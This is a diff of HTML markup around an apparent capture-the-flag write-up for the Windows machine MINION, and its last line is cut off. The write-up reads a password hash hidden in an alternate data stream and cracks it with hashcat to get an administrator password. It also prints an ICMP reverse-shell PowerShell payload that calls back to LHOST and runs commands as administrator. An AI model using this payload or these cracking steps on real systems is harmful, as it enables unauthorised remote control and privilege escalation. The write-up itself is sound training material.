+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">iis</span> <span class="n">apppool</span><span class="p">\</span><span class="n">defaultapppool</span><span class="nv">@MINION</span> <span class="n">inetsrv</span><span class="p">&gt;</span> <span class="n">DECODER</span>
+</span></span><span class="line"><span class="cl"><span class="n">Uploading</span> <span class="n">c</span><span class="p">.</span><span class="n">ps1</span> <span class="n">to</span> <span class="n">c:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">c</span><span class="p">.</span><span class="n">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="n">MD5</span> <span class="n">hash</span><span class="err">:</span> <span class="n">9e860b7e4773f394c7aa9be5b88b7cfc</span>
+</span></span><span class="line"><span class="cl"><span class="n">Data</span> <span class="n">Length</span><span class="err">:</span> <span class="n">976</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">100</span><span class="p">%|</span><span class="err">█████████████████████████████████████████████████████████████████████████</span><span class="p">|</span> <span class="n">990</span><span class="p">/</span><span class="n">990</span> <span class="p">[</span><span class="n">00</span><span class="err">:</span><span class="n">01</span><span class="p">&lt;</span><span class="n">00</span><span class="err">:</span><span class="n">00</span><span class="p">,</span> <span class="n">795</span><span class="p">.</span><span class="n">59bytes</span><span class="p">/</span><span class="n">s</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Waiting</span> <span class="k">for</span> <span class="n">decoder</span> <span class="n">shell</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">decoder</span><span class="nv">@MINION</span> <span class="n">system32</span><span class="p">&gt;</span> <span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">minion</span><span class="p">\</span><span class="n">decoder</span></span></span></code></pre></div></div></p>
 
 <h1 id="getting-admin">Getting admin</h1>
 
 <p>There is a backup.zip in the folder C:\users\decoder.MINION\Desktop:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">[P$] minion\decoder@MINION system32&gt; cd C:\users\decoder.MINION\Desktop
-</span><span class="go">[P$] minion\decoder@MINION Desktop&gt; ls
-</span><span class="go"></span><span class="err">
-</span><span class="err">
-</span><span class="err"></span><span class="go">    Directory: C:\users\decoder.MINION\Desktop
-</span><span class="go"></span><span class="err">
-</span><span class="err">
-</span><span class="err"></span><span class="go">Mode                LastWriteTime     Length Name                              
-</span><span class="go">----                -------------     ------ ----                              
-</span><span class="go">-a---          9/4/2017   7:19 PM     103297 backup.zip                        
-</span><span class="go">-a---         8/25/2017  11:09 AM         33 user.txt
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">[P$] minion\decoder@MINION system32&gt; cd C:\users\decoder.MINION\Desktop
+</span></span></span><span class="line"><span class="cl"><span class="go">[P$] minion\decoder@MINION Desktop&gt; ls
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Directory: C:\users\decoder.MINION\Desktop
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Mode                LastWriteTime     Length Name                              
+</span></span></span><span class="line"><span class="cl"><span class="go">----                -------------     ------ ----                              
+</span></span></span><span class="line"><span class="cl"><span class="go">-a---          9/4/2017   7:19 PM     103297 backup.zip                        
+</span></span></span><span class="line"><span class="cl"><span class="go">-a---         8/25/2017  11:09 AM         33 user.txt
+</span></span></span></code></pre></div></div></p>
 
 <p>We can unzip the backup.zip using powershell commands:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">FileSystem</span><span class="p">;</span> <span class="k">function</span> <span class="n">Unzip</span> <span class="p">{</span> <span class="k">param</span><span class="p">(</span><span class="no">[string]</span><span class="nv">$zipfile</span><span class="p">,</span> <span class="no">[string]</span><span class="nv">$outpath</span><span class="p">);</span> <span class="no">[System.IO.Compression.ZipFile]</span><span class="p">::</span><span class="n">ExtractToDirectory</span><span class="p">(</span><span class="nv">$zipfile</span><span class="p">,</span> <span class="nv">$outpath</span><span class="p">);</span> <span class="p">};</span> <span class="n">Unzip</span> <span class="s2">&#34;C:\Users\decoder.MINION\Desktop\backup.zip&#34;</span> <span class="s2">&#34;C:\temp\unzip&#34;</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">FileSystem</span><span class="p">;</span> <span class="k">function</span> <span class="n">Unzip</span> <span class="p">{</span> <span class="k">param</span><span class="p">(</span><span class="no">[string]</span><span class="nv">$zipfile</span><span class="p">,</span> <span class="no">[string]</span><span class="nv">$outpath</span><span class="p">);</span> <span class="no">[System.IO.Compression.ZipFile]</span><span class="p">::</span><span class="n">ExtractToDirectory</span><span class="p">(</span><span class="nv">$zipfile</span><span class="p">,</span> <span class="nv">$outpath</span><span class="p">);</span> <span class="p">};</span> <span class="n">Unzip</span> <span class="s2">&#34;C:\Users\decoder.MINION\Desktop\backup.zip&#34;</span> <span class="s2">&#34;C:\temp\unzip&#34;</span></span></span></code></pre></div></div></p>
 
 <p>But we are not gonna find anything useful inside this zip archive. But do you know/remember ADS (Alternate Data Streams)? Let&rsquo;s have a look:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">decoder</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="n">cmd</span> <span class="p">/</span><span class="n">C</span> <span class="nb">dir </span><span class="p">/</span><span class="n">Q</span> <span class="p">/</span><span class="nb">R
-</span><span class="nb"></span> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="p">.</span>
- <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="n">143B</span><span class="p">-</span><span class="n">1804</span>
-
- <span class="n">Directory</span> <span class="n">of</span> <span class="n">C:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">decoder</span><span class="p">.</span><span class="n">MINION</span><span class="p">\</span><span class="n">Desktop</span>
-
-<span class="n">09</span><span class="p">/</span><span class="n">22</span><span class="p">/</span><span class="n">20017</span>  <span class="n">04</span><span class="err">:</span><span class="n">43</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">MINION</span><span class="p">\</span><span class="n">decoder</span>         <span class="p">.</span>
-<span class="n">09</span><span class="p">/</span><span class="n">22</span><span class="p">/</span><span class="n">2017</span>  <span class="n">04</span><span class="err">:</span><span class="n">43</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>    <span class="p">..</span>
-<span class="n">09</span><span class="p">/</span><span class="n">044</span><span class="p">/</span><span class="n">2017</span>  <span class="n">07</span><span class="err">:</span><span class="n">19</span> <span class="n">PM</span>           <span class="n">103</span><span class="p">,</span><span class="n">297</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span> <span class="n">backup</span><span class="p">.</span><span class="n">zip</span>
-                                    <span class="n">34</span>                         <span class="n">backup</span><span class="p">.</span><span class="n">zip</span><span class="err">:</span><span class="n">pass</span><span class="err">:</span><span class="nv">$DATA</span>
-<span class="n">08</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2017</span>  <span class="n">11</span><span class="err">:</span><span class="n">09</span> <span class="n">AM</span>                <span class="n">33</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">decoder</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="n">cmd</span> <span class="p">/</span><span class="n">C</span> <span class="nb">dir </span><span class="p">/</span><span class="n">Q</span> <span class="p">/</span><span class="nb">R
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="n">143B</span><span class="p">-</span><span class="n">1804</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">Directory</span> <span class="n">of</span> <span class="n">C:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">decoder</span><span class="p">.</span><span class="n">MINION</span><span class="p">\</span><span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">09</span><span class="p">/</span><span class="n">22</span><span class="p">/</span><span class="n">20017</span>  <span class="n">04</span><span class="err">:</span><span class="n">43</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">MINION</span><span class="p">\</span><span class="n">decoder</span>         <span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">09</span><span class="p">/</span><span class="n">22</span><span class="p">/</span><span class="n">2017</span>  <span class="n">04</span><span class="err">:</span><span class="n">43</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>    <span class="p">..</span>
+</span></span><span class="line"><span class="cl"><span class="n">09</span><span class="p">/</span><span class="n">044</span><span class="p">/</span><span class="n">2017</span>  <span class="n">07</span><span class="err">:</span><span class="n">19</span> <span class="n">PM</span>           <span class="n">103</span><span class="p">,</span><span class="n">297</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span> <span class="n">backup</span><span class="p">.</span><span class="n">zip</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">34</span>                         <span class="n">backup</span><span class="p">.</span><span class="n">zip</span><span class="err">:</span><span class="n">pass</span><span class="err">:</span><span class="nv">$DATA</span>
+</span></span><span class="line"><span class="cl"><span class="n">08</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2017</span>  <span class="n">11</span><span class="err">:</span><span class="n">09</span> <span class="n">AM</span>                <span class="n">33</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span></span></span></code></pre></div></div></p>
 
 <p>I like the old cmd command dir /Q /R because it is brief and it shows very concisely the owners (/Q) and the ADS (/R). But If you want, you can see the ADS using Powershell too:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">decoder</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">Get-Item</span> <span class="n">-Path</span> <span class="n">c:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">decoder</span><span class="p">.</span><span class="n">MINION</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">backup</span><span class="p">.</span><span class="n">zip</span> <span class="n">-stream</span> <span class="p">*</span>
-
-   <span class="n">FileName</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">decoder</span><span class="p">.</span><span class="n">MINION</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">backup</span><span class="p">.</span><span class="n">zip</span>
-
-<span class="n">Stream</span>                   <span class="n">Length</span>
-<span class="p">------</span>                   <span class="p">------</span>
-
-<span class="err">:</span><span class="nv">$DATA</span>                   <span class="n">103297</span>
-<span class="n">pass</span>                         <span class="n">34</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">decoder</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">Get-Item</span> <span class="n">-Path</span> <span class="n">c:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">decoder</span><span class="p">.</span><span class="n">MINION</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">backup</span><span class="p">.</span><span class="n">zip</span> <span class="n">-stream</span> <span class="p">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">FileName</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">decoder</span><span class="p">.</span><span class="n">MINION</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">backup</span><span class="p">.</span><span class="n">zip</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Stream</span>                   <span class="n">Length</span>
+</span></span><span class="line"><span class="cl"><span class="p">------</span>                   <span class="p">------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">:</span><span class="nv">$DATA</span>                   <span class="n">103297</span>
+</span></span><span class="line"><span class="cl"><span class="n">pass</span>                         <span class="n">34</span></span></span></code></pre></div></div></p>
 
 <p>Let&rsquo;s read this ADS:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">decoder</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">type </span><span class="n">c:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">decoder</span><span class="p">.</span><span class="n">MINION</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">backup</span><span class="p">.</span><span class="n">zip</span><span class="err">:</span><span class="n">pass</span>
-<span class="n">28a5d1e0c15af9f8fce7db65d75bbf17</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">decoder</span><span class="nv">@MINION</span> <span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">type </span><span class="n">c:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">decoder</span><span class="p">.</span><span class="n">MINION</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">backup</span><span class="p">.</span><span class="n">zip</span><span class="err">:</span><span class="n">pass</span>
+</span></span><span class="line"><span class="cl"><span class="n">28a5d1e0c15af9f8fce7db65d75bbf17</span></span></span></code></pre></div></div></p>
 
 <p>We found a hash. Let&rsquo;s discover its type:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>hashid 28a5d1e0c15af9f8fce7db65d75bbf17
-<span class="go">Analyzing &#39;28a5d1e0c15af9f8fce7db65d75bbf17&#39;
-</span><span class="go">[+] MD2 
-</span><span class="go">[+] MD5 
-</span><span class="go">[+] MD4 
-</span><span class="go">[+] Double MD5 
-</span><span class="go">[+] LM 
-</span><span class="go">[+] RIPEMD-128 
-</span><span class="go">[+] Haval-128 
-</span><span class="go">[+] Tiger-128 
-</span><span class="go">[+] Skein-256(128) 
-</span><span class="go">[+] Skein-512(128) 
-</span><span class="go">[+] Lotus Notes/Domino 5 
-</span><span class="go">[+] Skype 
-</span><span class="go">[+] Snefru-128 
-</span><span class="go">[+] NTLM 
-</span><span class="go">[+] Domain Cached Credentials 
-</span><span class="go">[+] Domain Cached Credentials 2 
-</span><span class="go">[+] DNSSEC(NSEC3) 
-</span><span class="go">[+] RAdmin v2.x
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> hashid 28a5d1e0c15af9f8fce7db65d75bbf17
+</span></span><span class="line"><span class="cl"><span class="go">Analyzing &#39;28a5d1e0c15af9f8fce7db65d75bbf17&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] MD2 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] MD5 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] MD4 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Double MD5 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] LM 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] RIPEMD-128 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Haval-128 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Tiger-128 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Skein-256(128) 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Skein-512(128) 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Lotus Notes/Domino 5 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Skype 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Snefru-128 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] NTLM 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Domain Cached Credentials 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Domain Cached Credentials 2 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] DNSSEC(NSEC3) 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] RAdmin v2.x
+</span></span></span></code></pre></div></div></p>
 
 <p>We are in a Windows environment, so it&rsquo;s probably NTLM. Let&rsquo;s reverse this hash:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>hashcat -h <span class="p">|</span> grep NTLM
-<span class="go">   ... 
-</span><span class="go">   1000 | NTLM                                             | Operating Systems
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="gp">$ </span>hashcat -a0 -m <span class="m">1000</span> 28a5d1e0c15af9f8fce7db65d75bbf17 /usr/share/dict/rockyou.txt 
-<span class="go">...
-</span><span class="go">28a5d1e0c15af9f8fce7db65d75bbf17:1234test
-</span><span class="go">...
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> hashcat -h <span class="p">|</span> grep NTLM
+</span></span><span class="line"><span class="cl"><span class="go">   ... 
+</span></span></span><span class="line"><span class="cl"><span class="go">   1000 | NTLM                                             | Operating Systems
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> hashcat -a0 -m <span class="m">1000</span> 28a5d1e0c15af9f8fce7db65d75bbf17 /usr/share/dict/rockyou.txt 
+</span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">28a5d1e0c15af9f8fce7db65d75bbf17:1234test
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div></p>
 
 <p>If we try it, we are gonna find that this is the administrator password. We can execute commands as administrator like this:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$user</span> <span class="p">=</span> <span class="s1">&#39;.\administrator&#39;</span><span class="p">;</span> <span class="nv">$passwd</span> <span class="p">=</span> <span class="s1">&#39;1234test&#39;</span><span class="p">;</span> <span class="nv">$secpswd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$passwd</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$secpswd</span><span class="p">;</span> <span class="nb">invoke-command</span> <span class="n">-computername</span> <span class="n">localhost</span> <span class="n">-credential</span> <span class="nv">$credential</span> <span class="n">-scriptblock</span> <span class="p">{</span> <span class="n">COMMANDS</span> <span class="p">}</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$user</span> <span class="p">=</span> <span class="s1">&#39;.\administrator&#39;</span><span class="p">;</span> <span class="nv">$passwd</span> <span class="p">=</span> <span class="s1">&#39;1234test&#39;</span><span class="p">;</span> <span class="nv">$secpswd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$passwd</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$secpswd</span><span class="p">;</span> <span class="nb">invoke-command</span> <span class="n">-computername</span> <span class="n">localhost</span> <span class="n">-credential</span> <span class="nv">$credential</span> <span class="n">-scriptblock</span> <span class="p">{</span> <span class="n">COMMANDS</span> <span class="p">}</span></span></span></code></pre></div></div></p>
 
 <p>The way I used to get an admin shell is by replicating my ICMP powershell payload inside the scriptblock:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$user</span> <span class="p">=</span> <span class="s1">&#39;.\administrator&#39;</span><span class="p">;</span> <span class="nv">$passwd</span> <span class="p">=</span> <span class="s1">&#39;1234test&#39;</span><span class="p">;</span> <span class="nv">$secpswd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$passwd</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$secpswd</span><span class="p">;</span> <span class="nb">invoke-command</span> <span class="n">-computername</span> <span class="n">localhost</span> <span class="n">-credential</span> <span class="nv">$credential</span> <span class="n">-scriptblock</span> <span class="p">{</span> <span class="nv">$ip</span> <span class="p">=</span> <span class="s1">&#39;LHOST&#39;</span><span class="p">;</span> <span class="nv">$id</span> <span class="p">=</span> <span class="s1">&#39;UNIQUEID&#39;</span><span class="p">;</span> <span class="nv">$ic</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">Ping</span><span class="p">;</span> <span class="nv">$po</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">PingOptions</span><span class="p">;</span> <span class="nv">$po</span><span class="p">.</span><span class="n">DontFragment</span><span class="p">=</span><span class="nv">$true</span><span class="p">;</span> <span class="k">function</span> <span class="n">s</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$ic</span><span class="p">.</span><span class="n">Send</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="n">5000</span><span class="p">,(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$b</span><span class="p">),</span><span class="nv">$po</span><span class="p">)</span> <span class="p">};</span> <span class="k">function</span> <span class="n">p</span> <span class="p">{</span> <span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="s1">&#39;[P$] &#39;</span><span class="p">,$(</span><span class="n">whoami</span><span class="p">),</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="nv">$env:computername</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,$((</span><span class="nb">gi </span><span class="nv">$pwd</span><span class="p">).</span><span class="n">Name</span><span class="p">),</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span> <span class="p">};</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$r</span> <span class="p">=</span> <span class="n">s</span><span class="p">(</span><span class="n">p</span><span class="p">);</span> <span class="k">if</span> <span class="p">(!</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">)</span> <span class="p">{</span> <span class="k">continue</span><span class="p">;</span> <span class="p">};</span> <span class="nv">$rs</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">);</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="n">8</span><span class="p">)</span> <span class="o">-ne</span> <span class="nv">$id</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span> <span class="p">};</span> <span class="k">try</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="n">-Command</span> <span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">8</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Exception</span><span class="p">|</span><span class="nb">out-string</span><span class="p">)</span> <span class="p">};</span> <span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$rt</span><span class="p">.</span><span class="n">length</span><span class="p">-</span><span class="n">110</span><span class="p">)</span> <span class="p">{</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span><span class="n">110</span><span class="p">)));</span> <span class="nv">$i</span> <span class="p">-=</span> <span class="p">-</span><span class="n">110</span><span class="p">;</span> <span class="p">};</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">)));</span> <span class="p">}</span> <span class="p">}</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$user</span> <span class="p">=</span> <span class="s1">&#39;.\administrator&#39;</span><span class="p">;</span> <span class="nv">$passwd</span> <span class="p">=</span> <span class="s1">&#39;1234test&#39;</span><span class="p">;</span> <span class="nv">$secpswd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$passwd</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$secpswd</span><span class="p">;</span> <span class="nb">invoke-command</span> <span class="n">-computername</span> <span class="n">localhost</span> <span class="n">-credential</span> <span class="nv">$credential</span> <span class="n">-scriptblock</span> <span class="p">{</span> <span class="nv">$ip</span> <span class="p">=</span> <span class="s1">&#39;LHOST&#39;</span><span class="p">;</span> <span class="nv">$id</span> <span class="p">=</span> <span class="s1">&#39;UNIQUEID&#39;</span><span class="p">;</span> <span class="nv">$ic</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span 